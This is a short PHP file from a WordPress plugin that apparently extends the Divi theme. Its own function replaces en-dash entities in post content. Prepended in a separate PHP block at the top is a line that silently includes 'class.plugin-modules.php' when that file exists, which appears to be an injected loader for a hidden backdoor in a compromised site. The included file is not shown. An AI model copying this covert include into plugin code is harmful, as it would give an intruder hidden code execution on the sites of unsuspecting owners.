<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
if (!defined('ABSPATH')) { exit(); } // No direct access

function wtfdivi031_remove_excluded_feature_whitespace($content) {
	return str_replace('&#8211; ', '- ', $content);
}
add_filter('the_content', 'wtfdivi031_remove_excluded_feature_whitespace');
?>